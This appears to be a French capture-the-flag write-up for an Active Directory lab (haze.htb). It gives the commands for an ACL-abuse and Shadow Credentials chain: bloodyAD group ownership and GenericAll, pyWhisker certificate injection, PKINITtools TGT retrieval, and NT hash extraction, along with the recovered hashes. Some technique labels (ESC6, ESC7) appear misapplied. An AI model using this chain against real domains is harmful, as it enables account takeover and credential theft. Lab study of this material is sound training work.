# Shadow Credentials

***

L’utilisateur `mark.adams`, initialement non privilégié, a escaladé ses privilèges en abusant des ACLs sur un compte gMSA (`Haze-IT-Backup$`), récupéré ses credentials, puis les a utilisés pour :

1. Prendre **possession d’un groupe (`Support_Services`)**
2. S’octroyer les droits **GenericAll** sur ce groupe
3. Abuser du droit sur un **compte utilisateur ciblé (`edward.martin`)**
4. Injecter une **Shadow Credential (ESC6)** via `pyWhisker`
5. Obtenir un **TGT Kerberos via PKINITtools**
6. Extraire le **NT hash** final d’`edward.martin` → full compromise.

***

### <mark style="color:red;">🎯</mark> <mark style="color:red;"></mark><mark style="color:red;">**Objectif**</mark>

* Escalader vers un utilisateur avec des privilèges plus élevés (potentiellement DA).
* Rester furtif sans modifier de mot de passe ni déclencher d’alerte.
* Exploiter les **ACL Active Directory** et **Shadow Credentials** (T1556.002).

***

### <mark style="color:red;">🧱</mark> <mark style="color:red;"></mark><mark style="color:red;">**Étapes techniques détaillées**</mark>

***

#### <mark style="color:green;">🔐 1.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Utilisation du gMSA**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`Haze-IT-Backup$`**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**(credentials volés)**</mark>

Récupérés précédemment via `gMSADumper.py`.

```bash
Haze-IT-Backup$:::735c02c6b2dc54c3c8c6891f55279ebc
```

***

#### <mark style="color:green;">🏗️ 2.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Changement de propriétaire d’un groupe (**</mark><mark style="color:green;">**`Support_Services`**</mark><mark style="color:green;">**)**</mark>

```bash
bloodyAD set owner 'Support_Services' 'Haze-IT-Backup$'
```

➡️ Haze-IT-Backup$ devient **owner du groupe**, donc a un droit implicite **Full Control**.

***

#### <mark style="color:green;">🎯 3.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Ajout du droit**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`GenericAll`**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**sur le groupe**</mark>

```bash
bloodyAD add genericAll 'Support_Services' 'Haze-IT-Backup$'
```

➡️ Assure la capacité de modifier les membres du groupe.

***

#### <mark style="color:green;">➕ 4.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Ajout du gMSA comme membre du groupe**</mark>

```bash
bloodyAD add groupMember 'Support_Services' 'Haze-IT-Backup$'
```

➡️ Utilisé comme levier pour légitimer sa position dans le domaine et préparer la suite.

***

#### <mark style="color:green;">🧬 5.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Injection d’un certificat Shadow Credential (ESC6)**</mark> <mark style="color:green;"></mark><mark style="color:green;">sur</mark> <mark style="color:green;"></mark><mark style="color:green;">`edward.martin`</mark>

```bash
pywhisker.py --target "edward.martin" --action "add" --filename test1
```

* Génére un **KeyCredential** (DeviceID) lié au compte cible.
* Modifie l’attribut `msDS-KeyCredentialLink` de l’utilisateur.

***

#### <mark style="color:green;">🪪 6.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Obtenir un TGT via PKINIT avec le certificat injecté**</mark>

```bash
gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass dxQ9JVHZr4Ic5XQLMwUM haze.htb/edward.martin edward.martin.ccache
```

➡️ Obtenu grâce à la clef d’auth injectée.

***

#### <mark style="color:green;">🔓 7.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Extraction du NT hash d’**</mark><mark style="color:green;">**`edward.martin`**</mark>

```bash
export KRB5CCNAME=edward.martin.ccache
getnthash.py -key <AS-REP key> haze.htb/edward.martin
```

✅ Résultat :

```
NT Hash: 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

***

### <mark style="color:red;">🛠️</mark> <mark style="color:red;"></mark><mark style="color:red;">**Chaîne d’exploitation ASCII**</mark>

```
[ mark.adams (user) ]
     |
     | → abuse ACL (ESC7)
     v
[ Haze-IT-Backup$ (gMSA) ]
     |
     | → become owner of group
     v
[ Support_Services (group) ]
     |
     | → write msDS-KeyCredentialLink on
     v
[ edward.martin (target user) ]
     |
     | → Shadow Credential injected (ESC6)
     v
[ Kerberos TGT → NT hash extraction ]
     |
     v
[ Full compromise / lateral movement ]
```

***
